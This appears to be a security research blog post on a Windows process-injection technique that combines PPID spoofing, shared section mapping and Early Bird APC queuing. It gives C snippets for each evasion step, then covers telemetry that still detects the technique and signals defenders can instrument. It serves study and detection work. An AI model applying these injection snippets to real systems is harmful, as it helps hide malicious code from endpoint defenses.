---
title: "Early Bird APC Injection — The PPID Spoofing Combo"
description: "Combining PPID Spoofing, Memory Mapping, and Early Bird APC injection to hide process lineage and bypass the classic detection signatures of process injection."
date: 2026-04-02
type: "Research · Process Injection"
difficulty: "Advanced"
readingTime: 13
tags: [early-bird, ppid-spoofing, apc, injection, evasion]
---

## The three problems to solve

Classic process injection has three detection surfaces defenders know how to look for:

1. **The parent-child relationship.** An unknown executable spawning `svchost.exe` or `notepad.exe` is abnormal. Sysmon Event ID 1 records the PPID.
2. **The write primitive.** `WriteProcessMemory` into a freshly created process is a specific, well-known signal.
3. **The memory region.** The payload lands in a `MEM_PRIVATE` region with `RWX` or `RX` permissions — the "unbacked executable memory" heuristic.

The combination of **PPID Spoofing** + **Memory Mapping** + **Early Bird APC** addresses all three.

## The combo, step by step

### 1. PPID Spoofing

Before creating the target process, open a handle to a legitimate process (e.g. `explorer.exe`) and use `STARTUPINFOEXA` with the `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` attribute:

```c
STARTUPINFOEXA si = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T size = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);

HANDLE parent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorer_pid);
UpdateProcThreadAttribute(
    si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    &parent, sizeof(parent), NULL, NULL);

CreateProcessA(NULL, "notepad.exe", NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
    NULL, NULL, (STARTUPINFOA*)&si, &pi);
```

To Sysmon and to the process table, `explorer.exe` is now the parent of `notepad.exe`. That is a completely normal relationship.

### 2. Memory Mapping instead of WriteProcessMemory

Instead of allocating memory in the target and writing with `WriteProcessMemory`, create a **section** and map it into both processes:

```c
HANDLE hSection;
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
    PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

PVOID local = NULL;
NtMapViewOfSection(hSection, GetCurrentProcess(), &local, ...);
memcpy(local, payload, payload_size);

PVOID remote = NULL;
NtMapViewOfSection(hSection, pi.hProcess, &remote, ...);
```

No `WriteProcessMemory` call. The EDR that specifically watches for that API sees nothing.

### 3. Early Bird APC

The process is created **suspended** (`CREATE_SUSPENDED`). Before the primary thread runs, queue an APC pointing at the mapped view:

```c
QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0);
ResumeThread(pi.hThread);
```

The APC executes when the thread enters an alertable state — which Windows guarantees during process initialization, typically inside `ntdll!LdrInitializeThunk`. The payload runs **before** the process's own entry point.

## Why this is effective

- **The parent is legitimate.** Investigating `explorer.exe` leads nowhere.
- **The write API is not used.** `WriteProcessMemory` alerts are bypassed.
- **The memory type is `MEM_MAPPED`,** not `MEM_PRIVATE`. Many EDRs treat mapped memory as lower risk than private memory.

## Why it is still detectable

### ETW-Ti (Threat Intelligence)

Modern EDRs do not trust the PPID field. They subscribe to kernel ETW providers that record the **creator token** — the process object that physically called `NtCreateUserProcess`. Even with a spoofed PPID, the kernel knows which process created the target.

### OpenProcess on system processes

To spoof the parent as `explorer.exe`, the attacker must open a handle to `explorer.exe` with `PROCESS_CREATE_PROCESS` rights. An unsigned binary opening that handle against a system process is a strong indicator.

### Sysmon and EDR events

- **Event ID 1** records `ParentImage` and also `ParentProcessGuid`. The GUID often reveals the true creator.
- **Event ID 10** (`ProcessAccess`) fires when opening the handle to `explorer.exe` with suspicious rights.
- **Event ID 25** (`ProcessTampering`) catches some unmapped-image writes.

### Call stack from the APC

When the APC runs and the payload calls its first Windows API, the return address on the stack points into the mapped section (`MEM_MAPPED`). Some EDRs flag executable `MEM_MAPPED` just as aggressively as `MEM_PRIVATE`.

## Full flow

```
1. OpenProcess(explorer.exe, PROCESS_CREATE_PROCESS)
2. CreateProcess(notepad.exe, CREATE_SUSPENDED, PPID = explorer.exe)
3. NtCreateSection + NtMapViewOfSection (both processes)
4. memcpy payload into local view
5. QueueUserAPC(remote view, primary thread)
6. ResumeThread
```

Every step on its own is legitimate API usage. Only the combination, viewed together, is an attack — and only if the defender has the telemetry to see the combination.

## Detection: what to instrument

If you are building detections for this class:

- **PPID anomalies** — a parent that normally does not spawn the child. Requires baseline.
- **`PROCESS_CREATE_PROCESS`** opened on system processes by unsigned callers.
- **`NtMapViewOfSection` with `PAGE_EXECUTE_*`** into another process.
- **APCs queued to freshly created threads** in the first N milliseconds of process life.
- **Call stack walking** on the payload's first syscall.

None of these fire on their own. The value is in the correlation — which is exactly the point.
